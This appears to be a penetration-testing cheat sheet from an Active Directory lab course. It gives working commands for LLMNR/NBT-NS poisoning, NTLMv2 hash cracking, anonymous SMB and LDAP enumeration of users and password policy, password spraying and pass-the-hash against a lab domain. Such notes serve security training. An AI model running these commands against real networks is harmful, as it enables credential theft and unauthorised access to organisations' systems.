# Hash Stealing
### LLMNR/NBT-NS Poisoning from Linux
Several tools can be used to attempt ``LLMNR & NBT-NS`` poisoning :

|**Tool**|**Description**|
|---|---|
|[Responder](https://github.com/lgandx/Responder)|Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.|
|[Inveigh](https://github.com/Kevin-Robertson/Inveigh)|Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.|
|[Metasploit](https://www.metasploit.com/)|Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.|

```bash
responder -I ens33
```
### LLMNR/NBT-NS Poisoning from Windows
The tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder. Privileges might be needed.
```bash
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
### Cracking NTLMv2 Hashes w/ Hashcat
```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```



# ================================================



# Retrieving Password Policies
## Enumerating Password Policy from Linux
### SMB NULL Sessions
```bash
rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo
```

### LDAP Anonymous Bind
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Enum4Linux
```bash
enum4linux-ng -P 172.16.5.5
```


## Enumerating Password Policy from Windows
### SMB NULL Sessions
```bash
C:\htb> net use \\DC01\ipc$ "" /u:""
# Same using a username
C:\htb> net use \\DC01\ipc$ "" /u:guest
```

### From Windows CMD
```bash
C:\htb> net accounts
```

### Using PowerView.ps1
```bash
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```



# ================================================



# Enumerating Valid Users & Make A List
## SMB NULL Session
```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```bash
rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers
```

```bash
crackmapexec smb 172.16.5.5 --users
```

## LDAP Anonymous
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

```bash
windapsearch -d 10.10.10.161 -m users
```

## Kerbrute
This tool uses [Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication), which is a much faster and potentially stealthier way to perform password spraying.
```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```



# ================================================



# Password Spraying 
## Password Spraying from Linux
### Bash one-liner
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### Kerbrute
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

### NetExec
```bash
netexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
# Validating the found Creds
netexec smb 172.16.5.5 -u Jean.Mahmoud -p Password123 | grep +
```

### Local Admin Password Reuse
We could try to spray password on other non-domain joined hosts, not only domain user. The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine, which removes any risk of account lockout.
```bash
netexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```



## Password Spraying from Windows
### Using DomainPasswordSpray.ps1
```bash
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

